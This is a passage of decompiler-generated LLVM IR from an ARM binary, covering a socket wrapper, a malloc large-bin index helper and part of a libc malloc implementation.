  %v8_e08c = phi i32 [ %arg1, %dec_label_pc_e088 ], [ %v6_e088, %bb ]
  ret i32 %v8_e08c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e090 = load i32, i32* @r7, align 4
  store i32 %v3_e090, i32* %stack_var_-8, align 4
  %v0_e09c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e09c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_e09c, -4095
  br i1 %tmp, label %dec_label_pc_e0c4, label %dec_label_pc_e0ac

dec_label_pc_e0ac:                                ; preds = %entry
  %v0_e0b0 = call i32 @__aeabi_read_tp()
  %v3_e0b4 = load i16, i16* @global_var_24070.401, align 2
  %v4_e0b4 = sext i16 %v3_e0b4 to i32
  %v0_e0b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e0b8 = sub i32 0, %v0_e0b8
  store i32 %v1_e0b8, i32* %r2.global-to-local, align 4
  %v3_e0bc = add i32 %v4_e0b4, %v0_e0b0
  %v4_e0bc = inttoptr i32 %v3_e0bc to i32*
  store i32 %v1_e0b8, i32* %v4_e0bc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_e0c4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e0c4

dec_label_pc_e0c4:                                ; preds = %entry, %dec_label_pc_e0ac
  %v1_e0c8 = phi i32 [ %v0_e09c, %entry ], [ -1, %dec_label_pc_e0ac ]
  %v2_e0c4 = phi i32 [ %v3_e090, %entry ], [ %v2_e0c4.pre, %dec_label_pc_e0ac ]
  store i32 %v2_e0c4, i32* @r7, align 4
  ret i32 %v1_e0c8

; uselistorder directives
  uselistorder i32 %v0_e09c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e0c4, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i16* %arg2) local_unnamed_addr {
dec_label_pc_e0cc:
  %v0_e0cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e0cc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e0cc
  %tmp = ptrtoint i16* %arg2 to i32
  %v2_e0cc = load i32, i32* @sb, align 4
  %v9_e0cc = shl i32 %v2_e0cc, %tmp
  %v10_e0cc = and i32 %v9_e0cc, %arg1
  %v1_e0d0 = load i32, i32* @r5, align 4
  %v2_e0d0 = trunc i32 %v1_e0d0 to i16
  store i16 %v2_e0d0, i16* %arg2, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e0cc, %bb
  %v10_e0d0 = phi i32 [ %arg1, %dec_label_pc_e0cc ], [ %v10_e0cc, %bb ]
  ret i32 %v10_e0d0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_e0d4 = udiv i32 %arg1, 256
  store i32 %v3_e0d4, i32* %r1.global-to-local, align 4
  %v2_e0d8 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_e0d8, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_e0e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_e0d8, i32 %v0_e0e4)
  %v0_e0e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_e0e8 = add i32 %v0_e0e8, 1048320
  %v3_e0ec = udiv i32 %v1_e0e8, 65536
  %v1_e0f0 = and i32 %v3_e0ec, 8
  %v6_e0f4 = shl i32 %v0_e0e8, %v1_e0f0
  %v1_e0f8 = add i32 %v6_e0f4, 520192
  %v3_e0fc = udiv i32 %v1_e0f8, 65536
  %v1_e100 = and i32 %v3_e0fc, 4
  %v6_e104 = shl i32 %v6_e0f4, %v1_e100
  %v1_e108 = add i32 %v6_e104, 245760
  %v3_e10c = udiv i32 %v1_e108, 65536
  %v1_e110 = and i32 %v3_e10c, 2
  %v6_e114 = shl i32 %v6_e104, %v1_e110
  store i32 %v6_e114, i32* %r1.global-to-local, align 4
  %v1_e118 = sub nsw i32 13, %v1_e0f0
  %v2_e11c = sub nsw i32 %v1_e118, %v1_e100
  %v3_e120 = udiv i32 %v6_e114, 32768
  %v4_e120 = sub nuw nsw i32 -1, %v3_e120
  %v4_e124 = udiv i32 %v6_e114, 16384
  %v5_e124 = and i32 %v4_e124, %v4_e120
  %v2_e128 = sub nsw i32 %v2_e11c, %v1_e110
  %v2_e12c = add nsw i32 %v2_e128, %v5_e124
  %v1_e130 = add nsw i32 %v2_e12c, 6
  %v0_e134 = load i32, i32* %ip.global-to-local, align 4
  %v6_e134 = lshr i32 %v0_e134, %v1_e130
  %v3_e138 = mul nsw i32 %v2_e12c, 4
  %v1_e13c = add nsw i32 %v3_e138, 32
  %v1_e140 = urem i32 %v6_e134, 4
  %v2_e144 = or i32 %v1_e140, %v1_e13c
  ret i32 %v2_e144

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_e14c = load i32, i32* @r4, align 4
  %v6_e14c = load i32, i32* @r5, align 4
  %v9_e14c = load i32, i32* @r6, align 4
  %v12_e14c = load i32, i32* @r7, align 4
  %v15_e14c = load i32, i32* @r8, align 4
  %v18_e14c = load i32, i32* @sb, align 4
  %v21_e14c = load i32, i32* @sl, align 4
  %v24_e14c = load i32, i32* @fp, align 4
  %v27_e14c = load i32, i32* @lr, align 4
  store i32 116, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r1.global-to-local, align 4
  %v4_e160 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 116) to i32*), align 4
  store i32 %v4_e160, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_e16c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 72) to i32*), align 4
  store i32 %v4_e16c, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_e160, i32* %r2.global-to-local, align 4
  %v2_e178 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_e178, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %ip.global-to-local, align 4
  %v4_e184 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 120) to i32*), align 4
  store i32 %v4_e184, i32* %ip.global-to-local, align 4
  store i32 57744, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_e184)
  %v0_e190 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e190, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r1, align 4
  %v4_e19c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 16) to i32*), align 4
  store i32 %v4_e19c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_e1a8.550 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_e19c)
  %v0_e1a8 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_e1a8, -32
  br i1 %tmp, label %dec_label_pc_e1cc, label %dec_label_pc_e1b0

dec_label_pc_e1b0:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_15eb0.545 to i32), i32* %r2.global-to-local, align 4
  %v0_e1b4 = call i32 @__aeabi_read_tp()
  store i32 %v0_e1b4, i32* %r0.global-to-local, align 4
  %v3_e1b8 = load i16, i16* @global_var_24070.401, align 2
  %v4_e1b8 = sext i16 %v3_e1b8 to i32
  store i32 %v4_e1b8, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_e1c4 = add i32 %v4_e1b8, %v0_e1b4
  %v4_e1c4 = inttoptr i32 %v3_e1c4 to i32*
  store i32 12, i32* %v4_e1c4, align 4
  br label %dec_label_pc_ea50

dec_label_pc_e1cc:                                ; preds = %entry
  %v1_e1cc = add i32 %v0_e1a8, 11
  store i32 %v1_e1cc, i32* %r0.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r2.global-to-local, align 4
  %v2_e1d8 = icmp ugt i32 %v1_e1cc, 14
  %v7_e1d8 = icmp eq i32 %v1_e1cc, 15
  %v2_e1dc = xor i1 %v7_e1d8, true
  %v3_e1dc = and i1 %v2_e1d8, %v2_e1dc
  br i1 %v3_e1dc, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_e1cc
  %v5_e1dc = and i32 %v1_e1cc, -8
  store i32 %v5_e1dc, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_e1cc, %bb
  %v4_e1e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_e1e0, i32* @r0, align 4
  %v1_e1e4 = inttoptr i32 %v4_e1e0 to i32*
  %v2_e1e4 = load i32, i32* %v1_e1e4, align 4
  store i32 %v2_e1e4, i32* @r4, align 4
  %v2_e1e8 = xor i1 %v2_e1d8, true
  %v3_e1e8 = or i1 %v7_e1d8, %v2_e1e8
  br i1 %v3_e1e8, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_e1ec = urem i32 %v2_e1e4, 2
  %v2_e1ec = icmp eq i32 %v1_e1ec, 0
  br i1 %v2_e1ec, label %dec_label_pc_e1f4, label %dec_label_pc_e204

dec_label_pc_e1f4:                                ; preds = %bb140
  %v2_e1f4 = icmp eq i32 %v2_e1e4, 0
  br i1 %v2_e1f4, label %dec_label_pc_e1fc, label %dec_label_pc_e5e0

dec_label_pc_e1fc:                                ; preds = %dec_label_pc_e1f4
  %v0_e1fc = call i32 @__malloc_consolidate()
  store i32 %v0_e1fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e5e0

dec_label_pc_e204:                                ; preds = %bb140
  %v0_e204 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_e204, %v2_e1e4
  br i1 %tmp201, label %dec_label_pc_e22c, label %dec_label_pc_e20c

dec_label_pc_e20c:                                ; preds = %dec_label_pc_e204
  %v1_e20c = add i32 %v4_e1e0, -4
  store i32 %v1_e20c, i32* %r1.global-to-local, align 4
  %v3_e210 = udiv i32 %v0_e204, 8
  store i32 %v3_e210, i32* %r2.global-to-local, align 4
  %v4_e214 = mul nuw i32 %v3_e210, 4
  %v5_e214 = add i32 %v4_e214, %v1_e20c
  %v6_e214 = inttoptr i32 %v5_e214 to i32*
  %v7_e214 = load i32, i32* %v6_e214, align 4
  store i32 %v7_e214, i32* %r0.global-to-local, align 4
  %v2_e218 = icmp eq i32 %v7_e214, 0
  br i1 %v2_e218, label %dec_label_pc_e22c, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e20c
  %v2_e21c = add i32 %v7_e214, 8
  %v3_e21c = inttoptr i32 %v2_e21c to i32*
  %v4_e21c = load i32, i32* %v3_e21c, align 4
  store i32 %v4_e21c, i32* %r3.global-to-local, align 4
  store i32 %v2_e21c, i32* %r0.global-to-local, align 4
  store i32 %v2_e21c, i32* %r4.global-to-local, align 4
  store i32 %v4_e21c, i32* %v6_e214, align 4
  br label %dec_label_pc_ea34

dec_label_pc_e22c:                                ; preds = %dec_label_pc_e20c, %dec_label_pc_e204
  %tmp202 = icmp ugt i32 %v0_e204, 255
  br i1 %tmp202, label %dec_label_pc_e27c, label %dec_label_pc_e234

dec_label_pc_e234:                                ; preds = %dec_label_pc_e22c
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %ip.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_e23c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  %v3_e240 = udiv i32 %v0_e204, 8
  store i32 %v3_e240, i32* @r7, align 4
  %v4_e244 = mul nuw i32 %v3_e240, 8
  %v5_e244 = add i32 %v4_e23c, %v4_e244
  store i32 %v5_e244, i32* %r3.global-to-local, align 4
  %v1_e248 = add i32 %v5_e244, 44
  store i32 %v1_e248, i32* %ip.global-to-local, align 4
  %v1_e24c = add i32 %v5_e244, 56
  %v2_e24c = inttoptr i32 %v1_e24c to i32*
  %v3_e24c = load i32, i32* %v2_e24c, align 4
  store i32 %v3_e24c, i32* %r0.global-to-local, align 4
  %v9_e250 = icmp eq i32 %v3_e24c, %v1_e248
  br i1 %v9_e250, label %dec_label_pc_e3dc, label %dec_label_pc_e258

dec_label_pc_e258:                                ; preds = %dec_label_pc_e234
  %v2_e258 = add i32 %v3_e24c, %v0_e204
  store i32 %v2_e258, i32* %r3.global-to-local, align 4
  %v1_e25c = add i32 %v2_e258, 4
  %v2_e25c = inttoptr i32 %v1_e25c to i32*
  %v3_e25c = load i32, i32* %v2_e25c, align 4
  store i32 %v3_e25c, i32* %r2.global-to-local, align 4
  %v1_e260 = add i32 %v3_e24c, 12
  %v2_e260 = inttoptr i32 %v1_e260 to i32*
  %v3_e260 = load i32, i32* %v2_e260, align 4
  store i32 %v3_e260, i32* %r1.global-to-local, align 4
  %v1_e264 = or i32 %v3_e25c, 1
  store i32 %v1_e264, i32* %r2.global-to-local, align 4
  %v1_e268 = add i32 %v3_e24c, 8
  store i32 %v1_e268, i32* %r4.global-to-local, align 4
  store i32 %v1_e264, i32* %v2_e25c, align 4
  %v0_e270 = load i32, i32* %ip.global-to-local, align 4
  %v1_e270 = load i32, i32* %r1.global-to-local, align 4
  %v2_e270 = add i32 %v1_e270, 8
  %v3_e270 = inttoptr i32 %v2_e270 to i32*
  store i32 %v0_e270, i32* %v3_e270, align 4
  %v0_e274 = load i32, i32* %r1.global-to-local, align 4
  %v1_e274 = load i32, i32* %ip.global-to-local, align 4
  %v2_e274 = add i32 %v1_e274, 12
  %v3_e274 = inttoptr i32 %v2_e274 to i32*
  store i32 %v0_e274, i32* %v3_e274, align 4
  br label %dec_label_pc_ea34

dec_label_pc_e27c:                                ; preds = %dec_label_pc_e22c
  store i32 %v0_e204, i32* %r0.global-to-local, align 4
  %v1_e280 = call i32 @__malloc_largebin_index(i32 %v0_e204)
  store i32 %v1_e280, i32* %r0.global-to-local, align 4
  %v0_e284 = load i32, i32* @r4, align 4
  %v1_e284 = and i32 %v0_e284, 2
  %v2_e284 = icmp eq i32 %v1_e284, 0
  store i32 %v1_e280, i32* @r7, align 4
  br i1 %v2_e284, label %dec_label_pc_e3dc, label %dec_label_pc_e290

dec_label_pc_e290:                                ; preds = %dec_label_pc_e27c
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r1.global-to-local, align 4
  %v4_e298 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_e298, i32* @r0, align 4
  %v0_e29c = call i32 @__malloc_consolidate()
  store i32 %v0_e29c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e3dc

dec_label_pc_e2a4:                                ; preds = %dec_label_pc_e3f0
  %v1_e2a4 = add i32 %v3_e3f0, 4
  %v2_e2a4 = inttoptr i32 %v1_e2a4 to i32*
  %v3_e2a4 = load i32, i32* %v2_e2a4, align 4
  store i32 %v3_e2a4, i32* %r3.global-to-local, align 4
  %v0_e2a8 = load i32, i32* @sl, align 4
  %v1_e2ac = and i32 %v3_e2a4, -4
  store i32 %v1_e2ac, i32* %r4.global-to-local, align 4
  %v1_e2b0 = add i32 %v3_e3f0, 12
  %v2_e2b0 = inttoptr i32 %v1_e2b0 to i32*
  %v3_e2b0 = load i32, i32* %v2_e2b0, align 4
  store i32 %v3_e2b0, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_e2a8, 255
  br i1 %tmp203, label %dec_label_pc_e30c, label %dec_label_pc_e2b8

dec_label_pc_e2b8:                                ; preds = %dec_label_pc_e2a4
  %v9_e2b8 = icmp eq i32 %v3_e2b0, %v0_e310
  br i1 %v9_e2b8, label %dec_label_pc_e2c0, label %dec_label_pc_e30c

dec_label_pc_e2c0:                                ; preds = %dec_label_pc_e2b8
  %v0_e2c0 = load i32, i32* @sb, align 4
  %v1_e2c0 = add i32 %v0_e2c0, 48
  %v2_e2c0 = inttoptr i32 %v1_e2c0 to i32*
  %v3_e2c0 = load i32, i32* %v2_e2c0, align 4
  store i32 %v3_e2c0, i32* %r3.global-to-local, align 4
  %v9_e2c4 = icmp eq i32 %v3_e3f0, %v3_e2c0
  br i1 %v9_e2c4, label %dec_label_pc_e2cc, label %dec_label_pc_e30c

dec_label_pc_e2cc:                                ; preds = %dec_label_pc_e2c0
  %v1_e2cc = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_e2ac, %v1_e2cc
  br i1 %tmp204, label %dec_label_pc_e2d4, label %dec_label_pc_e30c

dec_label_pc_e2d4:                                ; preds = %dec_label_pc_e2cc
  %v2_e2d4 = sub i32 %v1_e2ac, %v0_e2a8
  store i32 %v2_e2d4, i32* %r2.global-to-local, align 4
  %v2_e2d8 = add i32 %v0_e2a8, %v3_e3f0
  store i32 %v2_e2d8, i32* %r3.global-to-local, align 4
  %v1_e2dc = or i32 %v0_e2a8, 1
  store i32 %v1_e2dc, i32* %r0.global-to-local, align 4
  %v1_e2e0 = or i32 %v2_e2d4, 1
  store i32 %v1_e2e0, i32* %r1.global-to-local, align 4
  %v1_e2e4 = add i32 %v3_e3f0, 8
  store i32 %v1_e2e4, i32* %r4.global-to-local, align 4
  %v2_e2e8 = add i32 %v0_e310, 8
  %v3_e2e8 = inttoptr i32 %v2_e2e8 to i32*
  store i32 %v2_e2d8, i32* %v3_e2e8, align 4
  %v0_e2ec = load i32, i32* %r3.global-to-local, align 4
  %v1_e2ec = load i32, i32* %ip.global-to-local, align 4
  %v2_e2ec = add i32 %v1_e2ec, 12
  %v3_e2ec = inttoptr i32 %v2_e2ec to i32*
  store i32 %v0_e2ec, i32* %v3_e2ec, align 4
  %v0_e2f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_e2f0 = load i32, i32* @r6, align 4
  %v2_e2f0 = add i32 %v1_e2f0, 4
  %v3_e2f0 = inttoptr i32 %v2_e2f0 to i32*
  store i32 %v0_e2f0, i32* %v3_e2f0, align 4
  %v0_e2f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e2f4 = load i32, i32* @sb, align 4
  %v2_e2f4 = add i32 %v1_e2f4, 48
  %v3_e2f4 = inttoptr i32 %v2_e2f4 to i32*
  store i32 %v0_e2f4, i32* %v3_e2f4, align 4
  %v0_e2f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e2f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_e2f8 = add i32 %v1_e2f8, %v0_e2f8
  %v4_e2f8 = inttoptr i32 %v3_e2f8 to i32*
  store i32 %v0_e2f8, i32* %v4_e2f8, align 4
  %v0_e2fc = load i32, i32* %r1.global-to-local, align 4
  %v1_e2fc = load i32, i32* %r3.global-to-local, align 4
  %v2_e2fc = add i32 %v1_e2fc, 4
  %v3_e2fc = inttoptr i32 %v2_e2fc to i32*
  store i32 %v0_e2fc, i32* %v3_e2fc, align 4
  %v0_e300 = load i32, i32* %ip.global-to-local, align 4
  %v1_e300 = load i32, i32* %r3.global-to-local, align 4
  %v2_e300 = add i32 %v1_e300, 12
  %v3_e300 = inttoptr i32 %v2_e300 to i32*
  store i32 %v0_e300, i32* %v3_e300, align 4
  %v0_e304 = load i32, i32* %ip.global-to-local, align 4
  %v1_e304 = load i32, i32* %r3.global-to-local, align 4
  %v2_e304 = add i32 %v1_e304, 8
  %v3_e304 = inttoptr i32 %v2_e304 to i32*
  store i32 %v0_e304, i32* %v3_e304, align 4
  br label %dec_label_pc_ea34

dec_label_pc_e30c:                                ; preds = %dec_label_pc_e2cc, %dec_label_pc_e2c0, %dec_label_pc_e2b8, %dec_label_pc_e2a4
  %v9_e30c = icmp eq i32 %v1_e2ac, %v0_e2a8
  %v2_e310 = add i32 %v3_e2b0, 8
  %v3_e310 = inttoptr i32 %v2_e310 to i32*
  store i32 %v0_e310, i32* %v3_e310, align 4
  %v0_e314 = load i32, i32* %ip.global-to-local, align 4
  %v1_e314 = load i32, i32* %r5.global-to-local, align 4
  %v2_e314 = add i32 %v1_e314, 12
  %v3_e314 = inttoptr i32 %v2_e314 to i32*
  store i32 %v0_e314, i32* %v3_e314, align 4
  br i1 %v9_e30c, label %dec_label_pc_e46c.loopexit, label %dec_label_pc_e328

dec_label_pc_e328:                                ; preds = %dec_label_pc_e30c
  %v0_e328 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_e328, 255
  br i1 %tmp205, label %dec_label_pc_e34c, label %dec_label_pc_e330

dec_label_pc_e330:                                ; preds = %dec_label_pc_e328
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r2.global-to-local, align 4
  %v1_e334 = load i32, i32* %r8.global-to-local, align 4
  %v2_e334 = add i32 %v1_e334, ptrtoint (i32* @global_var_24010.405 to i32)
  %v3_e334 = inttoptr i32 %v2_e334 to i32*
  %v4_e334 = load i32, i32* %v3_e334, align 4
  %v3_e338 = udiv i32 %v0_e328, 8
  store i32 %v3_e338, i32* %r0.global-to-local, align 4
  %v4_e33c = mul nuw i32 %v3_e338, 8
  %v5_e33c = add i32 %v4_e334, %v4_e33c
  store i32 %v5_e33c, i32* %r3.global-to-local, align 4
  %v1_e340 = add i32 %v5_e33c, 44
  store i32 %v1_e340, i32* %ip.global-to-local, align 4
  %v1_e344 = add i32 %v5_e33c, 52
  %v2_e344 = inttoptr i32 %v1_e344 to i32*
  %v3_e344 = load i32, i32* %v2_e344, align 4
  store i32 %v3_e344, i32* @lr, align 4
  br label %dec_label_pc_e3a4

dec_label_pc_e34c:                                ; preds = %dec_label_pc_e328
  store i32 %v0_e328, i32* %r0.global-to-local, align 4
  %v1_e350 = call i32 @__malloc_largebin_index(i32 %v0_e328)
  store i32 %v1_e350, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %ip.global-to-local, align 4
  %v1_e358 = load i32, i32* %r8.global-to-local, align 4
  %v2_e358 = add i32 %v1_e358, ptrtoint (i32* @global_var_24010.405 to i32)
  %v3_e358 = inttoptr i32 %v2_e358 to i32*
  %v4_e358 = load i32, i32* %v3_e358, align 4
  %v4_e35c = mul i32 %v1_e350, 8
  %v5_e35c = add i32 %v4_e358, %v4_e35c
  store i32 %v5_e35c, i32* %r3.global-to-local, align 4
  %v1_e360 = add i32 %v5_e35c, 44
  store i32 %v1_e360, i32* %ip.global-to-local, align 4
  %v1_e364 = add i32 %v5_e35c, 52
  %v2_e364 = inttoptr i32 %v1_e364 to i32*
  %v3_e364 = load i32, i32* %v2_e364, align 4
  store i32 %v3_e364, i32* @lr, align 4
  %v9_e368 = icmp eq i32 %v3_e364, %v1_e360
  br i1 %v9_e368, label %dec_label_pc_e3a4, label %dec_label_pc_e370

dec_label_pc_e370:                                ; preds = %dec_label_pc_e34c
  %v1_e370 = add i32 %v5_e35c, 56
  %v2_e370 = inttoptr i32 %v1_e370 to i32*
  %v3_e370 = load i32, i32* %v2_e370, align 4
  store i32 %v3_e370, i32* %r1.global-to-local, align 4
  %v1_e374 = add i32 %v3_e370, 4
  %v2_e374 = inttoptr i32 %v1_e374 to i32*
  %v3_e374 = load i32, i32* %v2_e374, align 4
  store i32 %v3_e374, i32* %r3.global-to-local, align 4
  %v0_e378 = load i32, i32* %r4.global-to-local, align 4
  %v3_e378 = icmp ult i32 %v0_e378, %v3_e374
  br i1 %v3_e378, label %.thread, label %dec_label_pc_e394.preheader

.thread:                                          ; preds = %dec_label_pc_e370
  store i32 %v1_e360, i32* @lr, align 4
  store i32 %v3_e370, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e3a4

dec_label_pc_e394.preheader:                      ; preds = %dec_label_pc_e370
  %v2_e380 = or i32 %v0_e378, 1
  store i32 %v2_e380, i32* %r2.global-to-local, align 4
  %v1_e394179 = add i32 %v3_e364, 4
  %v2_e394180 = inttoptr i32 %v1_e394179 to i32*
  %v3_e394181 = load i32, i32* %v2_e394180, align 4
  store i32 %v3_e394181, i32* %r3.global-to-local, align 4
  %v3_e398183 = icmp ult i32 %v2_e380, %v3_e394181
  br i1 %v3_e398183, label %dec_label_pc_e390, label %dec_label_pc_e3a0

dec_label_pc_e390:                                ; preds = %dec_label_pc_e394.preheader, %dec_label_pc_e390
  %v0_e3a0184 = phi i32 [ %v3_e390, %dec_label_pc_e390 ], [ %v3_e364, %dec_label_pc_e394.preheader ]
  %v1_e390 = add i32 %v0_e3a0184, 8
  %v2_e390 = inttoptr i32 %v1_e390 to i32*
  %v3_e390 = load i32, i32* %v2_e390, align 4
  store i32 %v3_e390, i32* @lr, align 4
  %v1_e394 = add i32 %v3_e390, 4
  %v2_e394 = inttoptr i32 %v1_e394 to i32*
  %v3_e394 = load i32, i32* %v2_e394, align 4
  store i32 %v3_e394, i32* %r3.global-to-local, align 4
  %v3_e398 = icmp ult i32 %v2_e380, %v3_e394
  br i1 %v3_e398, label %dec_label_pc_e390, label %dec_label_pc_e3a0

dec_label_pc_e3a0:                                ; preds = %dec_label_pc_e390, %dec_label_pc_e394.preheader
  %v0_e3a0.lcssa = phi i32 [ %v3_e364, %dec_label_pc_e394.preheader ], [ %v3_e390, %dec_label_pc_e390 ]
  %v1_e3a0 = add i32 %v0_e3a0.lcssa, 12
  %v2_e3a0 = inttoptr i32 %v1_e3a0 to i32*
  %v3_e3a0 = load i32, i32* %v2_e3a0, align 4
  store i32 %v3_e3a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e3a4

dec_label_pc_e3a4:                                ; preds = %.thread, %dec_label_pc_e34c, %dec_label_pc_e330, %dec_label_pc_e3a0
  %v0_e3c4 = phi i32 [ %v1_e360, %dec_label_pc_e34c ], [ %v1_e340, %dec_label_pc_e330 ], [ %v3_e3a0, %dec_label_pc_e3a0 ], [ %v3_e370, %.thread ]
  %v0_e3b8 = phi i32 [ %v1_e350, %dec_label_pc_e34c ], [ %v3_e338, %dec_label_pc_e330 ], [ %v1_e350, %dec_label_pc_e3a0 ], [ %v1_e350, %.thread ]
  %v1_e3a8 = phi i32 [ %v1_e358, %dec_label_pc_e34c ], [ %v1_e334, %dec_label_pc_e330 ], [ %v1_e358, %dec_label_pc_e3a0 ], [ %v1_e358, %.thread ]
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r2.global-to-local, align 4
  %v2_e3a8 = add i32 %v1_e3a8, ptrtoint (i32* @global_var_24010.405 to i32)
  %v3_e3a8 = inttoptr i32 %v2_e3a8 to i32*
  %v4_e3a8 = load i32, i32* %v3_e3a8, align 4
  %v3_e3ac = sdiv i32 %v0_e3b8, 32
  store i32 %v3_e3ac, i32* %r3.global-to-local, align 4
  %v4_e3b0 = mul nsw i32 %v3_e3ac, 4
  %v5_e3b0 = add i32 %v4_e3a8, %v4_e3b0
  store i32 %v5_e3b0, i32* %r1.global-to-local, align 4
  %v1_e3b4 = add i32 %v5_e3b0, 820
  %v2_e3b4 = inttoptr i32 %v1_e3b4 to i32*
  %v3_e3b4 = load i32, i32* %v2_e3b4, align 4
  %v1_e3b8 = urem i32 %v0_e3b8, 32
  store i32 %v1_e3b8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_e3c0 = shl i32 1, %v1_e3b8
  %v8_e3c0 = or i32 %v3_e3b4, %v7_e3c0
  store i32 %v8_e3c0, i32* %r3.global-to-local, align 4
  %v1_e3c4 = load i32, i32* @r6, align 4
  %v2_e3c4 = add i32 %v1_e3c4, 12
  %v3_e3c4 = inttoptr i32 %v2_e3c4 to i32*
  store i32 %v0_e3c4, i32* %v3_e3c4, align 4
  %v0_e3c8 = load i32, i32* @lr, align 4
  %v1_e3c8 = load i32, i32* @r6, align 4
  %v2_e3c8 = add i32 %v1_e3c8, 8
  %v3_e3c8 = inttoptr i32 %v2_e3c8 to i32*
  store i32 %v0_e3c8, i32* %v3_e3c8, align 4
